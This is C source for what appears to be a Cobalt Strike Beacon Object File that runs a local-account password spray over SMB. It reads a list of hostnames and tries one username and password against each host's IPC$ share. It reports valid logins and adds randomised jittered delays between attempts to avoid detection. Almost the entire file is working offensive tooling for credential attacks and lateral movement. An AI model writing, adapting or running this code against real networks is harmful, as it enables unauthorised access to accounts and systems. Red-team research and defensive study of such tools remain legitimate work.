#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "passwordspraylocal.h"

//START TrustedSec BOF print code
#ifndef bufsize
#define bufsize 8192
#endif
char *output = 0;  
WORD currentoutsize = 0;
HANDLE trash = NULL; 
int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {   
    output = (char*)MSVCRT$calloc(bufsize, 1);
    currentoutsize = 0;
    return 1;
}

void internal_printf(const char* format, ...){
    int buffersize = 0;
    int transfersize = 0;
    char * curloc = NULL;
    char* intBuffer = NULL;
    va_list args;
    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args); 
    va_end(args);
    if (buffersize == -1) return;
    char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
    intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize, format, args); 
    va_end(args);
    if(buffersize + currentoutsize < bufsize) {
        MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    } else {
        curloc = intBuffer;
        while(buffersize > 0) {
            transfersize = bufsize - currentoutsize;
            if(buffersize < transfersize) transfersize = buffersize;
            MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if(currentoutsize == bufsize) printoutput(FALSE); 
            MSVCRT$memset(transferBuffer, 0, transfersize); 
            curloc += transfersize; 
            buffersize -= transfersize;
        }
    }
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
}

void printoutput(BOOL done) {
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, bufsize);
    if(done) {MSVCRT$free(output); output=NULL;}
}
//END TrustedSec BOF print code.

void secure_sleep(int base_seconds, int jitter_percent) {
    if (base_seconds <= 0) return;
    int sleep_ms = base_seconds * 1000;
    if (jitter_percent > 0) {
        MSVCRT$srand(KERNEL32$GetTickCount());
        int range = (sleep_ms * jitter_percent) / 100;
        if (range > 0) {
            int jitter = (MSVCRT$rand() % (range * 2)) - range;
            sleep_ms += jitter;
        }
    }
    if (sleep_ms > 0) KERNEL32$Sleep(sleep_ms);
}

// SMB Authentication via WNetAddConnection2W
int authenticate_smb(WCHAR* wHostname, WCHAR* wUsername, WCHAR* wPassword) {
    NETRESOURCEW nr;
    WCHAR remoteName[MAX_PATH];
    WCHAR fullUsername[MAX_PATH];

    // Build the UNC path and targeted username
    MSVCRT$_snwprintf(remoteName, MAX_PATH, L"\\\\%s\\IPC$", wHostname);
    MSVCRT$_snwprintf(fullUsername, MAX_PATH, L"%s\\%s", wHostname, wUsername);

    MSVCRT$memset(&nr, 0, sizeof(NETRESOURCEW));
    nr.dwType = RESOURCETYPE_ANY;
    nr.lpRemoteName = remoteName;

    DWORD dwResult = MPR$WNetAddConnection2W(&nr, wPassword, fullUsername, 0);

    if (dwResult == NO_ERROR) {
        MPR$WNetCancelConnection2W(remoteName, 0, TRUE);
        return 1; // VALID
    }
    
    // 1326 = Invalid Password, 1327 = Account Disabled
    if (dwResult == 1326 || dwResult == 1327) return 0; 
    
    return -1; // Host unreachable or Port 445 blocked
}

int go(char *args, int len) {
    WCHAR *wUsername, *wPassword;
    int sleepDuration, jitterPercent, iBytesLen;
    int count = 0, success_count = 0;
    CHAR* hostnamesFileBytes;
    datap parser;

    // Format: <file_bytes> <username> <password> <timer> <jitter>
    BeaconDataParse(&parser, args, len);
    hostnamesFileBytes = BeaconDataExtract(&parser, &iBytesLen);
    wUsername = (WCHAR*)BeaconDataExtract(&parser, NULL);
    wPassword = (WCHAR*)BeaconDataExtract(&parser, NULL);
    sleepDuration = BeaconDataInt(&parser);
    jitterPercent = BeaconDataInt(&parser);

    if (iBytesLen == 0) return -1;
    if (!bofstart()) return -1;

    internal_printf("[*] Starting Local Password Spray (SMB Authentication)\n");
    internal_printf("[*] Username: %S\n", wUsername);
    internal_printf("====================================================================================\n\n");

    char* hostname = MSVCRT$strtok(hostnamesFileBytes, "\r\n");
    while (hostname != NULL) {
        WCHAR wHostname[MAX_PATH];
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, hostname, -1, wHostname, MAX_PATH);

        int result = authenticate_smb(wHostname, wUsername, wPassword);

        if (result == 1) {
            internal_printf("[+] VALID: \\\\%S\\%S\n", wHostname, wUsername);
            success_count++;
        } else if (result == 0) {
            // internal_printf("[-] FAIL: \\\\%S\n", wHostname);
        } else {
            //internal_printf("[!] ERROR: Host \\\\%S unreachable (Port 445)\n", wHostname);
        }

        count++;
        hostname = MSVCRT$strtok(NULL, "\r\n");
        if (hostname != NULL) secure_sleep(sleepDuration, jitterPercent);
    }

    printoutput(TRUE);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Spray complete. Tested: %d, Hits: %d\n", count, success_count); 
    return 0;
}